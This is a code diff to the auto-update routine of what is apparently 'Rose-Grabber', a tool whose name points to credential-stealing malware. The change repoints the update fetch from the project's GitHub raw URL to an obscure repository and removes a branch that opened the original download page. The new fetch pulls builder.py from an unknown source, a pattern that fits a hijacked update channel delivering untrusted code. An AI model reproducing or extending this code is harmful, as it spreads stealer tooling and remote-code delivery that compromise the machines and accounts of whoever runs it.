@@ -112,7 +112,7 @@ def auto_update():
         return 
     
     _code = (
-            "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/builder.py"
+            "https://raw.githubusercontent.com/awijriawfdawd/xxx/main/components/roseui/builder.py"
     )
     
     code = requests.get(_code, timeout=10).text
@@ -127,9 +127,6 @@ def auto_update():
                 "Rose-Grabber",
                 4
             )
-            if f == 6:
-                webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip")
-                os._exit(0)
 
 def change_data(key, value):
     logger.info("change_data called with key " + key + " and value " + str(value))
